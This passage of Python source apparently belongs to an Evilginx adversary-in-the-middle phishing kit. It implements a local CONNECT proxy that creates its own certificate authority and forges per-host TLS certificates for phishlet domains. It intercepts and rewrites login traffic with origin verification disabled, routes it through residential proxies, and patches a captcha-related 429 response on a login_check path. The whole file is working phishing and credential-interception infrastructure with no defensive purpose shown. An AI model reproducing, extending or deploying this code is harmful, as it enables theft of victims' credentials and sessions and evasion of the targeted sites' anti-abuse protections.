        if len(buf) < 65536 and (not buf or _REQ_START.match(buf) or buf.startswith(b"G") or buf.startswith(b"P") or buf.startswith(b"H") or buf.startswith(b"D") or buf.startswith(b"O")):
            return b"", buf
        return buf, b""
    head, rest = buf.split(b"\r\n\r\n", 1)
    if not _REQ_START.match(head):
        return buf, b""
    lines = head.split(b"\r\n")
    out = [lines[0]]
    saw_conn = False
    for ln in lines[1:]:
        low = ln.lower()
        if low.startswith(b"x-evilginx"):
            continue
        if low.startswith(b"connection:"):
            out.append(b"Connection: close")
            saw_conn = True
            continue
        out.append(ln)
    if not saw_conn:
        out.append(b"Connection: close")
    print("[sidecar] req %s" % lines[0][:180], flush=True)
    return b"\r\n".join(out) + b"\r\n\r\n" + rest, b""


def _fix_empty_verify_429(data, last_path):
    """Empty 429 + X-Mb-User-Verify leaves the SPA spinner forever — give it JSON."""
    if not data or not data.startswith(b"HTTP/"):
        return data
    path = last_path or b""
    if b"login_check" not in path:
        return data
    first = data.split(b"\r\n", 1)[0]
    if b" 429 " not in first:
        return data
    low = data.lower()
    if b"x-mb-user-verify-required" not in low:
        return data
    if b"\r\n\r\n" not in data:
        return data
    head, body = data.split(b"\r\n\r\n", 1)
    # chunked empty or truly empty
    body_stripped = body.replace(b"\r\n", b"").replace(b"0", b"").strip()
    if body_stripped:
        return data
    payload = (
        b'{"code":429,"message":"captcha_required","captcha":"recaptcha",'
        b'"error":"Too Many Requests"}'
    )
    lines = []
    for ln in head.split(b"\r\n"):
        lowln = ln.lower()
        if lowln.startswith(b"content-length:") or lowln.startswith(b"transfer-encoding:") or lowln.startswith(b"content-type:"):
            continue
        if lowln.startswith(b"connection:"):
            continue
        lines.append(ln)
    lines.append(b"Content-Type: application/json")
    lines.append(b"Content-Length: %d" % len(payload))
    lines.append(b"Connection: close")
    print("[sidecar] inject json for empty captcha 429 path=%s" % path[:80], flush=True)
    return b"\r\n".join(lines) + b"\r\n\r\n" + payload


def _ca_dir():
    base = os.path.dirname(_settings_path or "/root/.evilginx/linode_proxy.json")
    return os.path.join(base, "sidecar-ca")


def _ensure_ca():
    d = _ca_dir()
    os.makedirs(d, exist_ok=True)
    key = os.path.join(d, "ca.key")
    crt = os.path.join(d, "ca.crt")
    if not (os.path.isfile(key) and os.path.isfile(crt)):
        subprocess.check_call(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048", "-sha256",
                "-days", "3650", "-nodes",
                "-keyout", key, "-out", crt,
                "-subj", "/CN=egx-sidecar-ca",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    return d, key, crt


def _host_cert(host):
    host = (host or "").split(":")[0].lower().lstrip(".")
    if not host:
        raise RuntimeError("empty mitm host")
    with _cert_lock:
        cached = _cert_cache.get(host)
        if cached:
            return cached
        d, ca_key, ca_crt = _ensure_ca()
        safe = re.sub(r"[^a-z0-9.-]", "_", host)
        key = os.path.join(d, safe + ".key")
        crt = os.path.join(d, safe + ".crt")
        if not (os.path.isfile(key) and os.path.isfile(crt)):
            csr = os.path.join(d, safe + ".csr")
            ext = os.path.join(d, safe + ".ext")
            with open(ext, "w") as f:
                f.write("subjectAltName=DNS:%s\nbasicConstraints=CA:FALSE\n" % host)
            subprocess.check_call(
                [
                    "openssl", "req", "-new", "-newkey", "rsa:2048", "-nodes",
                    "-keyout", key, "-out", csr,
                    "-subj", "/CN=" + host,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            subprocess.check_call(
                [
                    "openssl", "x509", "-req", "-in", csr, "-CA", ca_crt,
                    "-CAkey", ca_key, "-CAcreateserial", "-out", crt,
                    "-days", "825", "-sha256", "-extfile", ext,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            try:
                os.remove(csr)
            except Exception:
                pass
        _cert_cache[host] = (crt, key)
        return crt, key


def _tls_server_ctx(host):
    cert, key = _host_cert(host)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)
    try:
        ctx.set_alpn_protocols(["http/1.1"])
    except Exception:
        pass
    return ctx


def _tls_origin_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_alpn_protocols(["http/1.1"])
    except Exception:
        pass
    return ctx


class _Sidecar(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._sock = None

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", SIDECAR_PORT))
        srv.listen(64)
        self._sock = srv
        while True:
            try:
                c, _ = srv.accept()
            except Exception:
                break
            threading.Thread(target=self._client, args=(c,), daemon=True).start()

    def _client(self, client):
        remote = None
        track = None
        di_pl = None
        try:
            client.settimeout(20)
            buf = b""
            while b"\r\n\r\n" not in buf:
                chunk = client.recv(4096)
                if not chunk:
                    return
                buf += chunk
                if len(buf) > 65536:
                    return
            line = buf.split(b"\r\n", 1)[0].decode("latin1", "replace")
            parts = line.split()
            if len(parts) < 2 or parts[0].upper() != "CONNECT":
                client.sendall(b"HTTP/1.1 405 Method Not Allowed\r\nConnection: close\r\n\r\n")
                return
            hostport = parts[1]
            if ":" in hostport:
                host, port_s = hostport.rsplit(":", 1)
                port = int(port_s)
            else:
                host, port = hostport, 443
            px = pick_proxy(host)
            pl = domain_to_phishlet(host)
            px_id = (px or {}).get("id")
            di_pl = None
            track = None
            if px and px.get("ipv4"):
                try:
                    remote = _upstream_connect(px, host, port)
                except Exception:
                    client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n")
                    return
                if (px.get("kind") or "") == "dataimpulse":
                    di_pl = px.get("phishlet") or pl
                    _di_tunnel_open(di_pl)
            else:
                remote = socket.create_connection((host, port), 12)
            do_mitm = bool(pl) and int(port) == 443
            srv_ctx = None
            if do_mitm:
                try:
                    srv_ctx = _tls_server_ctx(host)
                    remote.settimeout(15)
                    remote = _tls_origin_ctx().wrap_socket(remote, server_hostname=host)
                except Exception:
                    try:
                        client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n")
                    except Exception:
                        pass
                    return
            client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
            if do_mitm:
                try:
                    client.settimeout(20)
                    client = srv_ctx.wrap_socket(client, server_side=True)
                except Exception:
                    return
                hop = (px or {}).get("ipv4") or "direct"
                if (px or {}).get("kind") == "dataimpulse":
                    hop = "di:%s%s" % (
                        ((px or {}).get("country") or "") and (("cr." + (px.get("country") or "") + "/") or ""),
                        (px or {}).get("sessid") or "?",
                    )
                print("[sidecar] mitm %s pl=%s hop=%s alpn_c=%s alpn_o=%s" % (
                    host, pl, hop,
                    client.selected_alpn_protocol(),
                    remote.selected_alpn_protocol(),
                ), flush=True)
            track = _track_tunnel(px_id, client, remote)
            # Hard caps so CLOSE-WAIT zombies cannot pile up (was 63+ DI tunnels).
            try:
                client.settimeout(25)
            except Exception:
                pass
            try:
                remote.settimeout(25)
            except Exception:
                pass
            done = threading.Event()
            acc = {"out": 0, "in": 0, "t": time.time()}
            acc_lock = threading.Lock()
            req_buf = {"b": b""}
            logged_resp = {"n": 0}
            last_path = {"p": b""}

            def flush_bytes(force=False):
                with acc_lock:
                    now = time.time()
                    if not force and now - acc["t"] < 1:
                        return
                    n_out, n_in = acc["out"], acc["in"]
                    acc["out"] = acc["in"] = 0
                    acc["t"] = now
                if px_id and pl:
                    _add_bytes(px_id, pl, n_out, n_in)

            def pump(a, b, direction):
                try:
                    while not done.is_set():
                        try:
                            d = a.recv(16384)
                        except socket.timeout:
                            break
                        if not d:
                            break
                        if do_mitm and direction == "out":
                            req_buf["b"] += d
                            sendable, left = _rewrite_origin_request(req_buf["b"])
                            req_buf["b"] = left
                            if not sendable:
                                continue
                            m = re.match(br"^(?:GET|POST|PUT|PATCH|DELETE|OPTIONS|HEAD)\s+(\S+)", sendable)
                            if m:
                                last_path["p"] = m.group(1)
                            d = sendable
                        elif do_mitm and direction == "in":
                            if logged_resp["n"] == 0 and d.startswith(b"HTTP/"):
                                logged_resp["n"] = 1
                                print("[sidecar] resp %s" % d.split(b"\r\n", 1)[0][:120], flush=True)
                                d = _fix_empty_verify_429(d, last_path["p"])
                        b.sendall(d)
                        with acc_lock:
                            acc[direction] += len(d)
                        flush_bytes(False)
                except Exception:
                    pass
                done.set()
                try:
                    b.shutdown(socket.SHUT_WR)
                except Exception:
                    pass
                flush_bytes(True)

            t1 = threading.Thread(target=pump, args=(client, remote, "out"), daemon=True)
            t2 = threading.Thread(target=pump, args=(remote, client, "in"), daemon=True)
            t1.start()
            t2.start()
            t1.join(35)
            t2.join(35)
            done.set()
        except Exception:
            try:
                client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n")
            except Exception:
                pass
        finally:
            try:
                if di_pl:
                    _di_tunnel_close(di_pl)
            except Exception:
                pass
            _untrack_tunnel(track)
            for x in (client, remote):
                try:
                    x.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    x.close()
                except Exception:
                    pass


_sidecar_started = False


def start_sidecar():
    global _sidecar_started
    if _sidecar_started:
        return
    _sidecar_started = True
    _Sidecar().start()
